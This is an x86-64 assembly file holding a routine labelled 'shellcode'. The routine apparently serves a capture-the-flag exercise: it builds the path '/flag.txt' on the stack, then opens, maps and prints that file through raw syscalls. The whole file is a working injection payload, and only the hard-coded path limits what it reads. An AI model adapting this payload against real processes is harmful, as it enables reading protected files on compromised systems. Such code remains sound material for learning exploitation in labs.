.section .text, "ax"
.code64

#define O_RDONLY 0

#define SYS_OPEN 2
#define SYS_WRITE 1
#define SYS_MMAP 9

#define PROT_READ 1

#define MAP_PRIVATE 2

#define STDOUT 1

#define RDSZ 4096

.global shellcode
shellcode:
  subq $16, %rsp
  movb $'/', 0(%rsp)
  movb $'f', 1(%rsp)
  movb $'l', 2(%rsp)
  movb $'a', 3(%rsp)
  movb $'g', 4(%rsp)
  movb $'.', 5(%rsp)
  movb $'t', 6(%rsp)
  movb $'x', 7(%rsp)
  movb $'t', 8(%rsp)
  movb $0, 9(%rsp)
  /* open(path, O_RDONLY) */
  movq %rsp, %rdi
  movq $O_RDONLY, %rsi
  movq $SYS_OPEN, %rax
  syscall
  cmpq $0, %rax
  jl 1f
  /* mmap(NULL, RDSZ, PROT_READ, MAP_PRIVATE, 0) */
  movq $0, %rdi
  movq $RDSZ, %rsi
  movq $PROT_READ, %rdx
  movq $MAP_PRIVATE, %r10
  movq %rax, %r8
  movq $0, %r9
  movq $SYS_MMAP, %rax
  syscall
  cmpq $0xFFFFFFFFFFFFFFFF, %rax
  je 1f
  /* write(stdout, addr, RDSZ) */
  movq $STDOUT, %rdi
  movq %rax, %rsi
  movq $RDSZ, %rdx
  movq $SYS_WRITE, %rax
  syscall
1:
  addq $16, %rsp
  ret
